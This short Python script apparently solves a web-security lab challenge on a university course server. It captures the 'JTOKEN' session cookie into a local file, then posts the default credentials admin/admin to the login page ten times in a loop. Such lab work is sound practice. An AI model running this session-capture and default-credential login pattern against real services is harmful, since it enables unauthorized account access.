import requests

SERVER = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22652/login"
session = requests.session()

r = session.get(SERVER)
#print(r.cookies)

file = open("cookie_file.txt", "w")
#print("session cookies= ", session.cookies)
all_cookies = requests.utils.dict_from_cookiejar(session.cookies)
#print("all_cookies", all_cookies)

file.write(all_cookies['JTOKEN'])
file.close()

i=10
while i:
    data = {'username': 'admin', 'password' : 'admin'}

    r = session.post(SERVER, data=data)
    #print("\npost cookies", r.cookies)

    i-=1



    
